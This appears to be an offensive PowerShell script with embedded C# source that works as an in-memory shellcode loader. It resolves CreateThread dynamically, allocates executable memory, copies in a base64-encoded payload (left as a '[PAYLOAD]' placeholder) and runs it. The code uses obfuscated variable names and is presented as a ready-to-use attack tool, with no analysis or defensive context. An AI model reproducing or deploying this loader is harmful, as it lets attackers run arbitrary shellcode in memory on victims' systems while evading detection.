$Injector = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace Injector
{
    public class Shellcode
    {
		private static UInt32 VAR1 = 0x1000;
		private static UInt32 VAR2 = 0x40;
		
		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, UInt32 VAR6);
		
		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(IntPtr VAR3, UInt32 VAR4);
		
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr VAR10(IntPtr VAR3, UInt32 VAR4, IntPtr VAR5, IntPtr VAR6, UInt32 VAR7, UInt32 VAR8);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string VAR3);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr VAR3, string VAR4);
	

        static public void Exec(byte[] cmd)
        {
			IntPtr VAR11 = LoadLibrary("kernel32.dll");
			IntPtr VAR12 = GetProcAddress(VAR11, "CreateThread");
			VAR10 VAR13 = (VAR10)Marshal.GetDelegateForFunctionPointer(VAR12, typeof(VAR10));
			UInt32 VAR14 = VirtualAlloc(0, (UInt32)cmd.Length, VAR1, VAR2);
			Marshal.Copy(cmd, 0, (IntPtr)(VAR14), cmd.Length);
			IntPtr VAR15 = IntPtr.Zero;
			IntPtr VAR16 = IntPtr.Zero;
			VAR15 = VAR13(IntPtr.Zero, 0, (IntPtr)VAR14, VAR16, 0, 0);
			WaitForSingleObject(VAR15, 0xFFFFFFFF);
		}
    }
}
"@

Try {
    Add-Type -TypeDefinition $Injector -Language CSharp
} Catch {
    Write-Output "CSharp already loaded"
}
[Injector.Shellcode]::Exec([Convert]::FromBase64String("[PAYLOAD]"));
